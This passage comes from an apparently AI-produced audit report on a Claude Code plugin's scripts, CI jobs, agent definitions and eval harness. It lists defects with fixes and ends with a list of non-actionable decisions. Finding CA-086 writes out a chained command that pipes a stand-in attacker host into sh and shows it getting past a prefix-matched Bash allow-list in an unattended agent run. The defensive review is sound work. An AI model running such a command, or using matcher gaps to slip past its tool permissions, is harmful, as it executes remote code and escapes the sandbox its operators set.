operator-facing content is unreachable today). Residuals: (a) `edm-sync-canonical-sections` has no
`EDM-HELP` sentinels and keys its extractor on the literal `^set -euo pipefail` line, so moving or
annotating that line silently truncates `--help`; (b) the shared `print_help` was never created --
the one-line extractor is now hand-copied **twelve** times in three incompatible shapes, eight
keeping the leading `# ` and three stripping it, with a thirteenth copy at `wave7-smoke.sh:599`;
(c) the extractor's file argument splits three ways (`"$0"`, `"${BASH_SOURCE[0]}"`, `"$1"`);
(d) dispatch splits four ways (`-h|--help|help` in six, `-h|--help` in four, plus `edm-state`'s
empty-string acceptance); (e) the prescribed CI ban on the hardcoded-range form was never added.
*Fix*: put one `print_help <script-path>` in the shared library (or a small `bin/_edm-cli-lib.sh`),
source it from all nine `bin/` helpers and the three `evals/` scripts, convert
`edm-sync-canonical-sections` to sentinels, point `wave7:599` at the shared function, settle the
`# `-stripping question once, and add a `lint:bash-syntax` grep banning both a second
`EDM-HELP-BEGIN` awk literal and the `sed -n 'A,Bp' "$0"` form.

**CA-018 [multi-lens L6+L10] `agents/edm-audit-synthesizer.md:85-90`, `agents/edm-srd-auditor.md:65-70`.**
Round-1 P1 re-graded P2 by both lenses with the same rationale: the failure mode changed class from
an *inversion* (legacy definitions under canonical labels, producing an actively wrong answer) to an
*omission* a reader resolves by following the by-name pointer. The abolished legacy scale is gone
everywhere, and `skills/code-audit/SKILL.md:252` and `skills/audit-srd/SKILL.md:81` now carry the
pure by-name reference the prescription asked for. What survives: two files replaced the table with
a lossy four-bullet paraphrase -- P0 drops "or architecturally wrong", **P1 drops "missing
requirement"** (the exact clause round 1 named, in the agent that assigns ledger severity), P2 drops
"or nice-to-have" -- and the sentence introducing the bullets reads `Do not restate or adapt a local
scale.` immediately above a restated, adapted local scale. Half-applied edit: the prohibition was
added, the thing it prohibits was left in place.
*Fix*: delete `edm-audit-synthesizer.md:87-90` and `edm-srd-auditor.md:67-70`, keeping the by-name
sentence alone. If a summary must remain, paste CLAUDE.md's Definition column byte for byte and add
a smoke assertion that the pasted text is a substring of CLAUDE.md's.
*Disclosure*: this file defines the agent that produced this plan; this round's severities were
assigned from `plugins/edm/CLAUDE.md:215-220`, not from the local restatement.

**CA-070 (L6) `plugins/edm/CLAUDE.md:411`, `:325`, `:774-775`.** **All three halves received zero
edits** -- the only member of its round-1 remediation batch with no applied change, which L6 flags
as possibly dropped from the editing pass rather than attempted and missed.
(a) `:411` still documents `tokens.{... cache_write}`; the code writes `cache_write_5m` and
`cache_write_1h` (`edm-state:1705`, `:3135`), there is no `cache_write` key anywhere, and the same
file contradicts itself 56 lines later at `:467`. (b) `:325` covers 10 of 14 skills, omitting
`verify-runtime` (the mandatory Phase 6 closure step), `test`, `test-plan` and `test-coverage`; the
effort sentence accounts for no bucket containing `implement`, and names a QC *skill* that does not
exist. (c) `:774-775` says `schema_version` is "written once by `cmd_init` for the wave the running
plugin version belongs to"; `_cmd_init_render:1294` writes the literal `1`, so a brand-new
initiative created today by 3.1.0 warn-and-proceeds through four wave-B checks.
*Fix*: as stated in each half above. For (c), state the real behaviour and why; if writing 2 at init
was the intent, that is a code change for a correctness lens, not a doc edit.

**CA-152 (L6, medium) `plugins/edm/CLAUDE.md:449-456`.** The CA-012 rewrite is otherwise correct and
all twelve rate rows cross-check cell for cell. One claim did not survive: `:449` says the `case`
"now has eight explicit arms, **in this order**" and lists the `unknown` sentinel third, after all
six version arms; in the code `unknown` is arm 6 of 8, between `*haiku-4-6*` (`:390`) and
`*sonnet-4-7*` (`:407`). Behaviourally inert today, but this passage exists *because arm order is
the load-bearing property*, and a contributor adding the EDMV4 Sonnet 5 row uses this list to decide
where it goes.
*Fix*: better than reordering -- replace "in this order" with the two ordering **invariants**: every
explicit version arm precedes `*)`, and no bare family wildcard may be introduced ahead of `*)`.

**CA-068 (L6) `plugins/edm/CHANGELOG.md:203`.** Duplication half fixed. The AC8 row still cites
`git diff --stat` shows zero changes as the proof of PASS, which `:75-76` of the same file declares
invalid. Concrete this round: `hooks/hooks.json:86` **did** change during the CA-011 remediation, so
the row now asserts zero changes to a file that changed, using a method the same document says
cannot detect a change. The `hooks.json:80-90` line pin is also into a file that is edited.
*Fix*: replace the Evidence cell with the seven scoping assertions `:76` refers to (name them or the
smoke case that runs them); drop the `git diff --stat` claim and the line pin.

**CA-071 [multi-lens L1+L6] `.gitlab-ci.yml:191-194`.** Header half fixed (`:10-11` now names the
`bash:3.2` exception). The colon-with-no-list defect moved rather than closed: the evals size-budget
branch prints `"... exceeds the documented 100KB budget:"` and then `exit 1`, while the sibling
banned-file branch at `:173-174` earns its colon by printing the list. The per-file sizes are already
computed in the `while` loop at `:181-188` and discarded.
*Fix*: emit the breakdown before `exit 1`:
```bash
git ls-files -- plugins/edm/evals \
  | while IFS= read -r f; do [ -f "$f" ] || continue; printf '  %8s  %s\n' "$(wc -c < "$f")" "$f"; done \
  | sort -rn
```

**CA-017 [multi-lens L1+L6] `bin/edm-lint-artifacts:233-236`, help block `:20-28`.** Round-1 P1
re-graded P2 (the actively false statements are gone: the 40-percent budget claim, the
self-contradiction, and the wrong escape-valve mechanism at `:136-137` -- L1 confirms `:128-131` now
correctly names `EDM_MARKER_SET`). Residual is an omission that got worse by one: the comment says
"its two derived sets (ignore/mermaid)" while the loop at `:243-260` derives **four**
(`IGNORE_SETS`, `MERMAID_SETS`, `MARKER_SETS`, `FENCE_DIAGS`), and the help block enumerates four
violation classes while `unterminated-fence` is a fifth that also produces exit 1.
*Fix*: "its four derived sets (ignore / mermaid / marker / unterminated-fence)"; add
`unterminated-fence` to the help block's class list.

**CA-073 (L6) `bin/tests/timing.sh:308`, `:263-265`.** Neither half fixed. (a) `--all-lint` prints
`(${N_INITIATIVES} initiatives, ...)` where `N_INITIATIVES=50` is a constant only settable by
`--generate-fixture`'s `--initiatives N`; `--all-lint` takes `--dir DIR` and derives nothing from it,
so pointing it at a 10-initiative fixture reports "50 initiatives" -- in a harness whose header says
"no numbers are invented" and which `CHANGELOG.md:202` quotes as the AC7 PASS evidence. (b) the
`--mermaid-ratio` comment explains the ratio by a no-fence short-circuit that `:284-287` disables
for every file in the run, and says "near 1.0x" while `:295` prints "budget: <= 1.40x" and
`CHANGELOG.md:201` records 1.19x -- three different expectations.
*Fix*: (a) count the initiative directories at measurement time and print that. (b) rewrite the
comment to state the fixture honestly (one diagram in every file, worst realistic case, short-circuit
deliberately not exercised) and quote the 1.40x budget the mode prints.

**CA-074 (L7) `bin/edm-lint-artifacts:55`, `bin/edm-validate-prefix:24`.** Four `die()` shapes across
eleven scripts, none documented as intentional: `${2:-1}` (2 sites), `${2:-2}` (2 sites), fixed
`exit 1` (3 sites), fixed `exit 2` (5 sites). `edm-lint-artifacts` defaults to 1 among siblings that
default to 2 -- in the one script whose exit code a `PreToolUse` hook consumes and where 1 means
"violations found". `edm-validate-prefix` still inverts the family contract (1 = invalid format,
2 = collision) and its usage error also exits 1. **New sub-defect**: its `die()` is
`echo "edm-validate-prefix: $*" >&2; exit "${2:-1}"`, so `$*` prints the numeric exit code as the
last word of every diagnostic. Neither `set -uo`-without-`-e` site got its comment.
*Fix*: `edm-lint-artifacts:55` -> `${2:-2}`; `edm-validate-prefix:24` -> `local msg="$1"
code="${2:-1}"` and re-map onto the family (or state the exception in CLAUDE.md's `bin/` table);
`edm-sync-canonical-sections` usage errors -> exit 2; comment both `set -uo` sites or convert
`edm-check-skill-sync` to `-euo`.

**CA-049 [multi-lens L7+L10] `bin/edm-check-vocabulary:56` + 3 more; `bin/tests/_harness.sh:39-40`.**
Fixed: `edm-lint-artifacts:51` and `edm-check-grants:100` both use `${BASH_SOURCE[0]:-$0}`. Open:
`edm-check-vocabulary:56`, `edm-sync-canonical-sections:32`, `wave4b-smoke.sh:6` and
`wave6-smoke.sh:714` still derive the root four ways under two names (`SELF_DIR`/`PLUGIN_DIR`,
`SCRIPT_DIR`/`PLUGIN_ROOT`). **The vocabulary case got worse**: `:57` is now
`source "${SELF_DIR}/_edm-lint-lib.sh"`, so the `$0`-derived root is load-bearing for a `source`
(and `wave7-smoke.sh:31` establishes that sourcing a `bin/` script is a live pattern in this suite).
`_harness.sh` still exports no shared root, so five suites re-compute inline a value assigned one to
six lines above, and three suites keep a byte-identical bare-`mktemp -d` + `trap ... EXIT` preamble
that ignores `TMPDIR` and leaks a tree on Ctrl-C, while wave6/wave7 use a `TMPDIR`-honouring template
and `EXIT INT TERM` (L7's F12, merged here -- same root cause, no shared preamble).
*Fix*: `${BASH_SOURCE[0]:-$0}` at all four sites; settle on `SCRIPT_DIR` + `PLUGIN_ROOT`; export
`_HARNESS_PLUGIN_DIR` and `_HARNESS_REPO_ROOT` from `_harness.sh`, add `harness_scratch_dir()` beside
`with_scratch_repo`, and delete the per-suite preambles (~10 lines added, ~35 removed).

**CA-076 (L7) `.gitlab-ci.yml:63-83`, `:85-98`, `:134-154`.** Two of three elements fixed (`git`
dropped from `lint:grants` and `lint:vocabulary`; the library-doc count computed at `:246`).
`lint:bash-syntax`, `lint:artifacts` and `lint:shellcheck` still print no terminal job-named verdict
where four sibling jobs do, so a reader scanning seven collapsed logs cannot tell "passed" from
"stopped early" in three of them.
*Fix*: add `lint:bash-syntax: OK -- N file(s) parsed`, `lint:artifacts: OK` and
`lint:shellcheck: OK -- N file(s) clean` as the last script line of each, counted rather than
asserted.

**CA-079 (L7) `bin/tests/run-all.sh:2`, `:50`.** 51 non-ASCII bytes across seven test files
(`wave4a` 10, `wave3` 10, `wave5` 10, `harness-smoke` 7, `_harness` 11, `run-all` 2, `wave4b` 1)
while wave6, wave7 and timing.sh are clean. `run-all.sh:50` is the one that reaches **stdout on
every pipeline** via the blocking `test:smoke` job, so the aggregator emits on stdout the ASCII rule
that `plugins/edm/CLAUDE.md` Sec."Artifact content conventions" states for every artifact and that
the suite itself asserts for `edm-state`'s help text and every lens agent's output contract.
*Fix*: `run-all.sh:2` and `:50` first (they are printed), then `_harness.sh` and the four older
suites. Consider extending `edm-check-vocabulary`'s scope, which already reaches `bin/`, to
`bin/tests/*.sh`.

**CA-080 (L7) `agents/edm-audit-dead-code.md:50,55`, `agents/edm-audit-logic.md:51,56,73`.** The FAF
lead-in is now uniform across all eleven lenses. Not fixed, and more conspicuous because everything
around it converged: dead-code and logic still carry a `Before reporting:` preamble and a closing
line the other nine lack, in two non-matching phrasings whose trailers **disagree on whether the
criteria are conjunctive** ("If yes" vs "If yes to any") -- a semantic difference. And
`edm-audit-logic.md:73` still renders the canonical-severity clause as a bulleted field where the
other ten render the identical bare sentence.
*Fix*: delete the two preamble/trailer lines; flatten `edm-audit-logic.md:72-76` to the bare sentence
plus the fenced output block the other ten use.

**CA-081 (L7) `agents/edm-test-e2e.md:22`, `agents/edm-test-a11y.md:20`/`:136`.** Unchanged. e2e's
Step-0 token is a bare `"N/A"`, a strict prefix of all five siblings; a11y's `"N/A -- no UI"` is a
strict prefix of component's `"N/A -- no UI components"`; and `edm-test-a11y.md:138-139` claims its
bottom-of-file string "is the same exit token as Step 0's" when it is not. A caller matching by
substring -- which "a uniform signal" invites -- cannot distinguish a11y from component and matches
e2e on every one.
*Fix*: widen e2e's Step-0 token to `"N/A -- no e2e target"` and a11y's to
`"N/A -- no HTML-rendering UI"`, then make each bottom-of-file string begin with its own Step-0
token verbatim, as the four correct siblings already do.

**CA-095 [multi-lens L10+L11] `agents/edm-audit-*.md` (eleven files) + `bin/edm-check-grants:13`, `:335`.**
All eleven lens definitions still cite `skills/code-audit/SKILL.md:40` for a `mkdir -p` that was at
line 45 in round 1 and is at line 59 now -- **the one duplicated fact drifted a further fourteen
lines in eleven places at once, during a remediation pass that edited the file it cites.** Two more
stale citations in `edm-check-grants` point at `:44,99` and `:92,120` for templates now at `:193` and
`:222`.
*Fix*: drop the line numbers and cite the step or section by name in all thirteen places.

**CA-127 [multi-lens L6+L9, RE-OPENED from NOTED] `CLAUDE.md:54` (repository root).** Round 1 filed
this NOTED as "outside this audit's file scope, routed rather than filtered". L9 supplies the
ownership argument that was missing: the mechanically-consumed manifests are all correct
(`marketplace.json:35` = `3.1.0`, `:45` registers `./skills/verify-runtime`; `plugin.json:4` =
`3.1.0`), but the repository conventions doc still reads "**edm** (v2.1.0)" and enumerates 13 skills
with **no `/edm:verify-runtime`** -- a user-invocable skill this initiative shipped in wave B. No
ticket's Target Components names the file, but `tickets/README.md:92`'s cross-cutting AC ("Project
conventions doc ... updated if conventions change", scoped at `:90` to tickets that "change
user-visible behavior or public API") covers it, and a new slash command is both. L6 continues to
route it as out-of-scope; the re-open resolves the disagreement in favour of the pack's own AC.
*Fix*: update the version to `3.1.0` and add `/edm:verify-runtime` to the skill list in
`/Users/darryl.porter/projects/marketplace/CLAUDE.md:54`.

## Group E -- evals, CI and spec compliance

**CA-014 [multi-lens L5+L8] `evals/tiering-matrix.sh:136`; sweep at `bin/tests/wave7-smoke.sh:759-770`.**
Round-1 P1 re-graded P2 by L8 (the platform-blocking defect is gone: `:135` is now
`mktemp "${TMPDIR:-/tmp}/edm-tiering-matrix-selftest.XXXXXX"` with no suffix after the `X`s, so
`--self-test` no longer dies of EINVAL on BSD/macOS). Two prescribed halves did not land: the trap is
still `RETURN`-only rather than `RETURN EXIT INT TERM`, so a `die` or SIGINT inside `self_test`
leaks; and the T61 AC11 divergence sweep still greps **only** `bin/` and **only** for
`sed -i|grep -[a-zA-Z]*P|stat -c|stat -f` -- not `evals/`, and not `mktemp` templates, `date -d`,
`readlink -f`, `sort -V`, `head -n -N` or `printf %q`. The exact class that produced this finding can
regress in `evals/` and neither mechanism meant to protect the bash-3.2/BSD constraint will see it.
*Fix*: widen the trap; extend the sweep's directory set to `evals/` and its pattern set to the seven
idioms above.

**CA-162 (L8) `.gitlab-ci.yml:145` vs `:74`.** `lint:bash-syntax` iterates
`plugins/edm/bin/* plugins/edm/bin/tests/*.sh`; `lint:shellcheck` iterates only
`plugins/edm/bin/*`, and neither covers `plugins/edm/evals/*.sh` at all -- three executable bash
scripts including the eval driver that constructs a `claude` invocation with a permission posture.
This is the same blind spot that let CA-014's `mktemp` template and CA-088's unescaped interpolation
ship.
*Fix*: add `plugins/edm/evals/*.sh` to both loops and `plugins/edm/bin/tests/*.sh` to the shellcheck
loop. Expect new SC2086 hits under `bin/tests/` (all the same deliberate
space-separated-string-as-constant idiom) and carry them with the directive and rationale already
used in `bin/`.

**CA-161 (L8) `.gitlab-ci.yml:68`, `:90`, `:108`, `:121`, `:139`, `:167`, `:210`, `:267`, `:298`, `:327`, `:376`.**
Eleven blocking jobs each resolve `bash`, `jq`, `git`, `shellcheck` from a mutable Alpine package
index at run time, on top of images whose digests are self-declared placeholders (CA-111). The
header at `:10-20` presents digest pinning as the reproducibility story; neither layer is actually
pinned. A silently-changed `shellcheck` or `jq` minor version changes what `lint:shellcheck` and
`lint:artifacts` accept, and the failure presents as "the code broke".
*Fix*: pin the package versions (`apk add --no-cache bash=5.2.21-r0 ...`) or bake the four tools into
one pinned image and drop `before_script` from the blocking jobs entirely.

**CA-064 (L3) `evals/score-artifacts.sh:520-521`, `:526`.** An unparseable or zero-byte `run.json`
makes `jq` fail and `complete` empty, and the guard then coerces the **unknown** case to `"true"`.
`edm-compare-eval` keys the partial-run handshake off it, so a truncated run is compared against the
baseline -- precisely what the handshake exists to prevent.
*Fix*: `|| complete="false"` at `:521` and `:526`.

**CA-139 (L2) `evals/score-artifacts.sh:139-150`.** `score_from_ratio` clamps `v` to `>= 0` at `:145`
and then tests `(v < 0)` at `:147` in the same awk `BEGIN` block with no intervening assignment, so
`int(v - 0.5)` is structurally unreachable for every input -- in the one shared normalizer all five
dimensions run through. (`round_int` at `:133-135` has a real negative branch and is defensive, not
dead; leave it.)
*Fix*: `r = int(v + 0.5)`.

**CA-088 (L8) `evals/score-artifacts.sh:438`, `:448`.** Unchanged, moved. `lens_n` is derived from a
filename and interpolated raw into `grep -cE "^\| *L${lens_n}-[0-9]+ *\|"`. A run directory
containing a file literally named `lens-L*.jsonl` yields `lens_n="*"`, the ERE becomes
`^\| *L*-[0-9]+ *\|` (zero-or-more `L`), and dimension 5 scores against the wrong row count.
*Fix*: the prescribed one-line guard, `case "$lens_n" in ''|*[!0-9]*) continue ;; esac`.

**CA-165 (L11) `evals/score-artifacts.sh:448` vs `agents/edm-audit-*.md` Output Format.** Dimension 5
counts prose rows matching a leading `L{N}-NNN` local ID, which **only the hand-authored fixture
emits**. Every lens agent's Output Format template shows a plain integer row
(`edm-audit-wiring.md:95-97`, `edm-audit-dry.md:82-84`), and `skills/code-audit/SKILL.md:204` says
only "Write findings + Noted / Not Actionable section". So `md_count` is 0 for every real round,
`jsonl_count` is positive, and the dimension scores **100 against its own fixture and 0 against real
output**. P2 rather than P1 because `run-eval.sh` never runs a code-audit round, so the automatic
path returns null; the exposure is the invocation `fixtures/code-audit/README.md:49` documents as
supported.
*Fix*: put the `L{N}-NNN` local ID in the Output Format table of all eleven lens definitions
(`| ID | ... |`, `| L11-001 | ... |`) to match the fixture -- preferred, since the local ID is what
makes prose and JSONL line-matchable at all -- or relax the regex to count any leading data row.

**CA-138 (L2) `evals/tiering-matrix.sh:238-242`.** A self-test assertion byte-identical to the
branch-1 assertion 26 lines earlier against the same unchanged `$out`: it can never fail
independently, its success arm is `:` so it prints nothing, and it makes **seven** increment sites
report against a hardcoded `/6` denominator, so one real regression reports `2/6`. D28 cites this
self-test's count by name as the evidence the promotion rule is verified.
*Fix*: delete `:238-242`. Leave the `6` denominator -- it is correct for the six distinct assertions.

**CA-151 (L5) `evals/score-artifacts.sh:591`.** The scorer unconditionally writes `scores.json` into
whatever directory it is given, and `bin/tests/fixtures/code-audit/README.md:49` documents pointing
it at that **tracked** fixture directory -- which already deposited an untracked file there once.
*Fix*: require an explicit `--out` for a non-run directory, or refuse to write into a directory under
`bin/tests/fixtures/`. Update the README invocation to name a scratch output path.

**CA-066 (L5) `evals/run-eval.sh:201-202`; `evals/README.md`.** The half that made the blocking gate
misfire is fixed (`.gitlab-ci.yml:181-190` now measures tracked bytes via `git ls-files`). The
retention half is not: every invocation mints `evals/runs/<timestamp>_<sha>/` with three full
`claude -p` payloads plus stderr logs and nothing prunes; `evals/README.md` documents the directory
and `--out DIR` but states no retention rule. Correctly gitignored, so this is disk accumulation
only.
*Fix*: prune to the N most recent run directories at the end of a successful run and state the rule
in `evals/README.md` beside the `--out DIR` paragraph.

**CA-086 (L8) `evals/run-eval.sh:213-220` vs `:231`.** Unchanged, verbatim. The comment still claims
"nothing -- including acceptEdits itself -- grants unrestricted shell access" and "the run cannot
reach anything outside the scratch tree via a tool call", while `:231` grants `Bash(jq *)`,
`Bash(edm-state *)`, `Bash(edm-init *)` and `Bash(edm-validate-prefix *)` under a **literal prefix
matcher**, with `--permission-mode acceptEdits` and no human. `jq -n '""' ; curl attacker | sh`
satisfies the matcher. **CA-157 adds a second prefix that reaches the same place**, which makes the
claim doubly false. The prescription was to correct the comment, not the grant.
*Fix*: rewrite `:213-220` to state what the allow-list actually bounds and what it does not.

**CA-084 (L8) `bin/tests/timing.sh:294`.** `_now` and `_ms_between` are now guarded by
`command -v perl`, but `--mermaid-ratio` still calls `perl -e` **unconditionally**, so the mode
aborts under `set -euo pipefail` on the perl-less images the fallback exists for.
*Fix*: `awk -v a="$p95_base" -v b="$p95_mermaid" 'BEGIN{printf "%.2f", b/(a>0?a:1)}'`. Fix with
CA-158 in one edit.

**CA-087 (L8) `hooks/hooks.json:19`, `:32`, `:45`, `:58`, `:71`.** Unchanged. All five
`UserPromptExpansion` hooks run `prefix=$(echo "$ARGUMENTS" | awk '{print $1}')` with no charset
filter -- unlike the `PreToolUse` hook, which filters its derived prefixes -- and each ends
`|| exit 1` with no message when `$ARGUMENTS` is empty. The downstream sink is defended
(`state_file_for:197`), so the residual exposure depends on whether the host substitutes the argument
text into the command string before execution; that could not be settled from the repository in
either round. The fix is one `case` statement and is correct under either semantics.
*Fix*: `case "$prefix" in ''|*[!A-Za-z0-9_-]*) echo "[EDM] invalid prefix" >&2; exit 1 ;; esac`, and
give the empty case a message.

**CA-058 (L3) `bin/edm-lint-artifacts:142`, `:363`.** The `find` hardening landed (`-type f`,
`-print0`, unreadable-file guard, all three call sites consume `-d ""`). Residual: the class-4 line
sets still ride in the **environment** (`EDM_MERMAID_SET=... EDM_MARKER_SET=... awk ...`) with a
`|| true` consumer, so a large mostly-mermaid artifact can make `execve` return `E2BIG` on macOS
(ARG_MAX 256KB, environment counts against it), `|| true` swallows it, and class 4 silently reports
zero findings on a file that is entirely mermaid. Classes 1-3 pass their sets as shell variables and
have no such exposure.
*Fix*: pass the two sets on stdin, or through the temp-file idiom class 1 already uses for
`ATTR_PATTERN_FILE`; replace `|| true` with a status branch that reports `scan-error` as a violation.

**CA-034 (L9) `evals/baseline/README.md:9-10`, `:24`, `:28`.** Round-1 P1 re-graded P2: the ticket
half (`epics/03:400-406`) and the script half (`run-eval.sh:24-27`, `:37-39`, `:181-183`) are both
correctly reworked to the two sanctioned auth paths. The third named site was not:
`evals/baseline/README.md` still asserts "`run-eval.sh` only ever produces a real run directory by
calling `claude -p` against `ANTHROPIC_API_KEY`" and its closing command opens with
`export ANTHROPIC_API_KEY=sk-...`. That file **is** the closing command for T23 AC8/AC9/AC13, so the
stale precondition is load-bearing.
*Fix*: rewrite the three passages to name both sanctioned paths, matching `epics/03:400-406`.

**CA-089 (L9) `tickets/epics/05-orchestrator-dispatcher.md:101`, `:602-607`, `:628`.** Round-1 P2
unchanged in grade. The SRD half was amended as prescribed and is now honest (`srd.md:2755-2759`,
`:2763`; `epics/05:554`). The ticket body was not, so the pack contradicts both the amended SRD and
the tree in three places: (1) T39 AC7 still specifies "a script asserting the duplicated
orchestration blocks **are identical**" -- the shipped `bin/edm-check-skill-sync:42-60` asserts the
inverse; (2) its verify command describes exits the script does not have; (3) `:628` still reads
"written **only** on the fallback path. Do not build it speculatively" and `:101` still lists it as
"only on NO-GO", while `run-all.sh:137-144` invokes it.
*Fix*: amend the T39 AC7 text and verify command to describe the shipped tripwire; delete or amend
the do-not-build clauses at `:628` and `:101`. `architecture.md:873` and `:647` carry the same
phrasing historically in the alternatives-considered table and are correctly left alone.

**CA-163 (L9) `decisions.md:23` (D19), `:29` (D23).** `tickets/README.md:64-65` states that an
unverifiable AC is reworked "**through gate change control** -- never recorded as accepted". Six ACs
were reworked this remediation cycle; D19 still names **two** (T61 AC13, T01 AC9), and the four it
never named (T16 AC10, T42 AC12, T44 AC6, T56's CI row) were rewritten with no record anywhere. D23
is still framed entirely around T39 and never names T23, though T23 AC13 was rewritten from an
impossible temporal clause into an artifact-provenance assertion. Nothing in `decisions.md` postdates
D32.
*Fix*: extend D19 to name all six amended ACs with their before/after text, and add a D33 (or extend
D23) recording the T23 AC13 rework.

**CA-148 (L5) `.gitignore:10-16`.** No test asserts that `.gitignore` covers the lock and temp names
`edm-state` derives from `lockbase` -- which is why the same unmatched-pattern defect shipped in
EDMV2 and again in EDMV3 round 1.
*Fix*: a smoke case that runs a state mutation in a scratch repo, enumerates the paths created, and
asserts `git check-ignore -q` succeeds for each.

**CA-149 (L5) `.gitignore:10-14`.** Three patterns are anchored to the literal `SRD/` prefix while
`srd_root` relocation is documented and supported, so a relocated tree re-exposes the lock files and
the `findings-ledger`/`HANDOFF` staging files as untracked.
*Fix*: use unanchored patterns (`**/.edm-state.lock`, `**/.edm-state.lockd/`, `**/*.md.tmp.*`), or
have `edm-init` write them into the per-initiative `.gitignore` it already generates at `:160-163`.

**CA-150 (L5) `bin/edm-sync-canonical-sections:63`.** `canonical-sections.md.tmp.XXXXXX` is the only
staging path in the plugin that no `.gitignore` glob matches -- the prescribed
`plugins/edm/docs/*.tmp.*` line was never added -- and the trap omits `HUP`.
*Fix*: add the ignore line; `trap 'rm -f "$tmp"' EXIT INT TERM HUP`.

**CA-168 (L11) `docs/audit-patterns/test-coverage-audit.md`.** The only pattern-library document
with no loader **and** no writer. Each sibling has a named loader (`srd-audit.md` <-
`agents/edm-srd-writer.md:23` and `skills/plan/SKILL.md:116`; `ticket-audit.md` <-
`agents/edm-ticket-writer.md:27`; `qc-audit.md` and `code-audit.md` <-
`agents/edm-implementer.md:22-23`), and `bin/edm-state:3740-3743` maps four audit types to the four
siblings -- there is no audit type targeting this one, so `update-patterns` can never append to it.
Read-orphaned and write-orphaned at once.
*Fix*: add `Read plugins/edm/docs/audit-patterns/test-coverage-audit.md` to
`agents/edm-test-coverage-auditor.md`'s inputs (with the CA-022 anchor), or record in
`docs/audit-patterns/README.md` that the document is reference-only with a named reason. Silence is
the finding.

**CA-166 (L11) `skills/code-audit/SKILL.md:60`, with `:18`, `:48` vs `:70`, `:233`, `:247`.** Steps 6
and 7 brief every lens from `findings-ledger.md`, which `:18` and `:48` call "the persistent ledger"
and "canonical", while `:70`, `:233-234` and `:247` in the same file declare the **JSONL**
authoritative and the markdown its render. One file calls two artifacts canonical, and the
instruction that actually feeds all eleven lenses names the derived one. Because `render-ledger`
runs at step 9a of the *previous* round, a round interrupted before 9a briefs every lens off a stale
copy.
*Fix*: change `:60` to read `findings-ledger.jsonl` (falling back to the legacy `.md`, matching the
synthesizer's own wording at `:68`), and change `:18` and `:48` to name the JSONL as canonical with
the `.md` described as its rendering.

**CA-167 (L11) `skills/push-jira/SKILL.md:32`.** The single user-facing message printed when the
Atlassian MCP namespace is unreachable routes the operator to `CLAUDE.md -> 'Atlassian MCP setup'`.
No such section, heading or anchor exists anywhere in `plugins/edm/CLAUDE.md`; the string appears
exactly once in the whole plugin, in this message. The real guidance is the `jira_mcp_namespace`
userConfig row at `CLAUDE.md:609`/`:866` and `push-jira/SKILL.md:219`.
*Fix*: point at what exists, using the `Sec."..."` by-name form the rest of the plugin uses so a grep
finds it -- `CLAUDE.md Sec."Optional: Jira synchronization"` -- or add the named section.

---

## Decisions / Non-Findings

These items were flagged by one or more lenses and determined **Not Actionable**. Future audits
should NOT re-investigate them. Ledger IDs are assigned so the record survives.

**New this round:**

1. **CA-181 -- `bin/_edm-lint-lib.sh` reported untracked by L5 and L11.** Both read the same stale
   pre-commit `git status` snapshot; neither had `Bash`. `git ls-files --error-unmatch` exits 0 --
   the file is tracked, committed in `6ddcf0c`. Not a defect.
2. **CA-169 -- the flock file is deliberately never unlinked (`bin/edm-state:830`).** Round 1's
   `rm -f "${lockfile}"` prescription was correctly *not* applied: unlinking a released flock file
   breaks mutual exclusion. Add one comment at `:829` so round 3 does not "fix" it.
3. **CA-175 -- `bin/_edm-lint-lib.sh` is not scope creep (L9).** T30 AC9 (`epics/04:781-784`)
   explicitly sanctions "sources or mirrors"; `wave7-smoke.sh:1381` asserts it by AC name.
4. **CA-174 -- T48 AC4's `<date>` placeholder (`plugins/edm/CLAUDE.md:306`).** `:307-313` states
   "Status: NOT yet matrix-derived" with the D23 dependency and D28's closing command in place.
5. **CA-176 -- CA-020 residual: no step-8 JSONL precondition, no orchestrator-persists fallback.**
   Hardening, not a break; the wiring is closed. Worth doing given CA-130 reproduced twice.
6. **CA-177 -- CA-021 residual: "absence is authoritative" with no resolvability requirement.**
   Producer and consumer now name the same root; residual robustness only.
7. **CA-178 -- `verify-runtime/SKILL.md:8` grants `Bash(mkdir *)` with no `mkdir` instruction.** Dead
   permission surface; drop it in the next grant pass.
8. **CA-179 -- all eleven lens agents grant `KillShell`/`BashOutput` without `Bash`.** Uniform and
   inert; consistent-project-pattern dead grant surface.
9. **CA-180 -- `CLAUDE.md Sec."Skill-tool composition"` names bold inline text, not a heading.**
   Findable by the by-name grep the convention prescribes; `wave7-smoke.sh:2169` asserts on it.
10. **CA-172 -- `eval:nightly` merges `*node_edm` then overrides `rules:`.** Correct per YAML
    merge-key precedence; the `when:` requirement is documented at `.gitlab-ci.yml:512-516`.
11. **CA-173 -- redundant `[[ -n $ignore_set ]]` guards around `is_ignored_line`.** The function
    guards internally at `_edm-lint-lib.sh:82`; cosmetic in either direction.
12. **CA-170 -- `timing.sh` has no trap on any mode.** Every scratch tree honours `TMPDIR` and the
    five measuring modes `rm -rf` on the happy path; bounded ephemeral disk, never `git status`.
13. **CA-171 -- `harness-smoke.sh`'s three untrapped `mktemp` files.** Tiny, under `TMPDIR`, on a
    path whose assertion helpers never exit early.

**Carried and re-confirmed this round (27):** CA-105 (D32 pricing gap, assigned to EDMV4),
CA-106 (D23 eval baseline absent; the exit-3 handler that reports it is now reachable),
CA-107 (D28 `.tiering_results` has no producer), CA-108 (D26/D29 Mermaid-ratio budget -> EDMV4-T01),
CA-109 (D27 T67 AC9/AC13 pending a live runner), CA-110 (D30 `git ls-files` accepted for `find`),
CA-111 (placeholder image digests, authorized in file), CA-112 (`bash:3.2` floating tag, authorized),
CA-113 (em dashes in `bin/tests/` comments, allowlisted), CA-114 (`pattern_target_heading_for`
extension point), CA-115 (grant source 2 deliberately not fence-suppressed), CA-116
(`edm-check-grants` actor-first output, required by T03 AC7), CA-117 (`set -- $list`, now with an
explicit disable), CA-118 (`git rev-parse --verify` unqualified, pre-existing), CA-119
(`migrate-schema` advance-by-one, defensive against schema 3), CA-120 (`cmd_compare` retained
deliberately), CA-121 (two-stage flag parse), CA-122 (`edm-lint-ignore-end` inside a fence),
CA-123 (flock fd 200), CA-124 (`git add -A` in the throwaway scratch repo), CA-125 (`SETTABLE_KEYS`
widened by construction), CA-126 (`deferred` omitted from the expected-status list, now documented at
the site), CA-128 (lens JSONL skeleton deliberately unfactored, zero drift), CA-129
(`lint:pattern-library-contract` duplication deliberate), CA-130 (lens `Write` grant vs runtime tool
set -- host-side, reproduced twice), CA-131 (`${user_config.KEY}` interpolation undecidable
statically), CA-132 (D8, no Mermaid renderer spike).

**Explicitly NOT filtered, recorded so the argument is not re-made:**

